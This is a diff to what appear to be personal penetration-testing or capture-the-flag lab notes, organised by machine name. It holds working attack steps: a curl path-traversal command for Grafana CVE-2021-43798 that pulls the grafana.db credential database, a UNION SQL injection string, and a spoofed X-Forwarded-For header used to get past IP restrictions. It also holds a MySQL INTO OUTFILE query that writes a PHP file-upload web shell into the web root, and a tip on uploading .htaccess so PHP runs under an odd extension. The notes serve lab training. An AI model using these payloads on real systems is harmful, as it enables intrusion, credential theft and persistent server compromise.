@@ -41,11 +41,15 @@
 2. curl http://{{URL}}/public/plugins/mysql/..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fvar%2Flib%2Fgrafana%2Fgrafana.db --output grafana.db
 3. https://github.com/Sic4rio/Grafana-Decryptor-for-CVE-2021-43798
 
+#### Robust => SQLi + X-Forwarded-For header 
+1. Run `wfuzz -H "X-Forwarded-For: 10.10.10.1" --sc 302 -u http://{{RHOST}}/FUZZ.php -w /usr/share/wordlists/wfuzz/general/big.txt` 
+2. Run `%27+UNION+select+*+from+employees%27` with other field blank. 
+
 #### Squid => squid proxy, but mysql rev shell 
 ` SELECT "<?php echo \'<form action=\"\" method=\"post\" enctype=\"multipart/form-data\" name=\"uploader\" id=\"uploader\">\';echo \'<input type=\"file\" name=\"file\" size=\"50\"><input name=\"_upl\" type=\"submit\" id=\"_upl\" value=\"Upload\"></form>\'; if( $_POST[\'_upl\'] == \"Upload\" ) { if(@copy($_FILES[\'file\'][\'tmp_name\'], $_FILES[\'file\'][\'name\'])) { echo \'<b>Upload Done.<b><br><br>\'; }else { echo \'<b>Upload Failed.</b><br><br>\'; }}?>" INTO OUTFILE 'C:/wamp/www/uploader.php'; ` 
 
 
+If IP-restricted, try `X-Forwarded-For: 10.10.10.10` header. 
 Use curl -v to check header & version. Wappalyzer? 
 Also check for /webdav , /zm , /login ; and gobuster to find upload folder. 
 Try uploading `.htaccess` then php using custom ext (eg .dork). 
-
